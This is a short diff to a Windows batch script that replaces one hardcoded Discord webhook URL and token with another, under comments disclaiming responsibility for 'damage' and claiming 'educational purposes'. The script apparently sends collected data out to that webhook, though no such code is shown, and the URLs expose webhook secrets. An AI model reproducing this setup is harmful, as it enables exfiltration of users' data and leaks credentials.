@@ -3,7 +3,7 @@
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
-set webhook=https://discord.com/api/webhooks/1009432280722309200/GSo8YLdUuu6QgVwzTI0DnOSg9m9LZ1iyLjoiBFC9niVlZoUkjfusAN43XzIYStI4yBZN
+set webhook=https://discord.com/api/webhooks/1128756952516808845/o8IyQkhQkm0im0zAT91vdZmH_ib_NpCVt9RJGTFAdneJNz7fv43iT2zP6vfij4a8A9W3
 
 
 
